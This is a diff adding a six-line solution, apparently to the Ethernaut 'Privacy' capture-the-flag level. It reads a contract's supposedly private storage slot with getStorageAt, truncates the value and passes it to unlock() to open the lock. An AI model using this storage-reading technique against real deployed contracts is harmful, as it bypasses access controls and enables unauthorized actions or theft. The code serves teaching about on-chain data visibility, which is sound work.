@@ -1,0 +1,6 @@
+Level 12: Privacy
+
+key = await web3.eth.getStorageAt(contract.address, 5)
+key = key.slice(0, 34)
+await contract.unlock(key)
+await contract.locked()
